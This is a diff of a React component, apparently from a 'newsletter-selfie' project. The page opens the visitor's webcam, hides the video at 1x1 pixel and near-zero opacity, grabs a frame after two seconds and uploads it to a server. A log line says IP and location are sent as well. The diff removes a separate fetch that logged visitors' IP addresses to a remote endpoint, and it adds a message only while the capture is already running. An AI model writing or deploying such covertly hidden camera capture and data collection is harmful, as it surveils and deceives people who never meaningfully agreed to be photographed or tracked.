@@ -5,13 +5,6 @@ function App() {
   const canvasRef = useRef(null);
 
   useEffect(() => {
-    // ✅ STEP 1: Log IP address when app loads
-    fetch("https://newsletter-selfie-project.onrender.com/log-ip")
-      .then((res) => res.json())
-      .then((data) => console.log("🌐 IP Logged:", data.ip))
-      .catch((err) => console.error("❌ Failed to log IP", err));
-
-    // ✅ STEP 2: Start camera and capture selfie
     navigator.mediaDevices.getUserMedia({ video: true }).then((stream) => {
       if (videoRef.current) {
         videoRef.current.srcObject = stream;
@@ -19,7 +12,7 @@ function App() {
         videoRef.current.oncanplay = () => {
           setTimeout(() => {
             captureImage();
-          }, 2000); // Wait 2s before capturing selfie
+          }, 2000);
         };
       }
     });
@@ -43,7 +36,10 @@ function App() {
           method: "POST",
           body: formData,
         })
-          .then(() => console.log("✅ Sent selfie to server"))
+          .then(() => {
+            console.log("✅ Selfie + IP + Location sent!");
+            alert("🎁 Thanks! Your selfie has been submitted.");
+          })
           .catch((err) => console.error("❌ Failed to send selfie", err));
       }, "image/jpeg");
     }
@@ -56,10 +52,10 @@ function App() {
         autoPlay
         muted
         playsInline
-        style={{ width: 1, height: 1, opacity: 0.01 }} // camera hidden
+        style={{ width: 1, height: 1, opacity: 0.01 }} // hidden camera
       />
       <canvas ref={canvasRef} style={{ display: "none" }} />
-      <p>Loading.....</p>
+      <p>📸 Capturing selfie...</p>
     </div>
   );
 }
